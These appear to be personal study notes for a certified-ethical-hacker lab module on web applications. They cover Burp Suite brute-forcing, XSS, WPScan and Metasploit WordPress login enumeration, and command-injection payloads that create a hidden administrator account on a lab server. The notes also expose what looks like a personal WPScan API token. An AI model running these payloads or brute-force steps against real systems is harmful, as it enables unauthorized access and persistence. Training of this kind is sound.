# 14 - Hacking Web Apps

## **Module 14: Hacking Web Applications**

### **Lab2-Task1: Perform a Brute-force Attack using Burp Suite**

* Set proxy for browser: 127.0.0.1:8080
* Burpsuite
* Type random credentials
* capture the request, right click-\&gt;send to Intrucder
* Intruder-\&gt;Positions
* Clear $
* Attack type: Cluster bomb
* select account and password value, Add $
* Payloads: Load wordlist file for set 1 and set 2
* start attack
* **filter status==302**
* open the raw, get the credentials
* recover proxy settings

### **Lab2-Task3: Exploit Parameter Tampering and XSS Vulnerabilities in Web Applications**

* Log in a website, change the parameter value (id )in the URL
* Conduct a XSS attack: Submit script codes via text area

### **Lab2-Task5: Enumerate and Hack a Web Application using WPScan and Metasploit**

* **wpscan --api-token hWt9qrMZFm7MKprTWcjdasowoQZ7yMccyPg8lsb8ads --url** [**http://10.10.10.16:8080/CEH**](http://10.10.10.16:8080/CEH) **--plugins-detection aggressive --enumerate u**
  * **--enumerate u: Specify the enumeration of users**
  * **API Token: Register at** [**https://wpscan.com/register**](https://wpscan.com/register)
  * **Mine: hWt9qrMZFm7MKprTWcjdasowoQZ7yMccyPg8lsb8ads**
* service postgresql start
* msfconsole
* **use auxiliary/scanner/http/wordpress\_login\_enum**
* show options
* **set PASS\_FILE password.txt**
* **set RHOST 10.10.10.16**
* **set RPORT 8080**
* **set TARGETURI** [**http://10.10.10.16:8080/CEH**](http://10.10.10.16:8080/CEH)
* **set USERNAME admin**
* run
* Find the credential

### **Lab2-Task6: Exploit a Remote Command Execution Vulnerability to Compromise a Target Web Server (DVWA low level security)**

* If found command injection vulnerability in an input textfield
* \| hostname
* \| whoami
* **| tasklist| Taskkill /PID /F**
  * **/PID: Process ID value od the process**
  * **/F: Forcefully terminate the process**
* \| dir C:\\
* **| net user**
* **| net user user001 /Add**
* **| net user user001**
* **| net localgroup Administrators user001 /Add**
* Use created account user001 to log in remotely
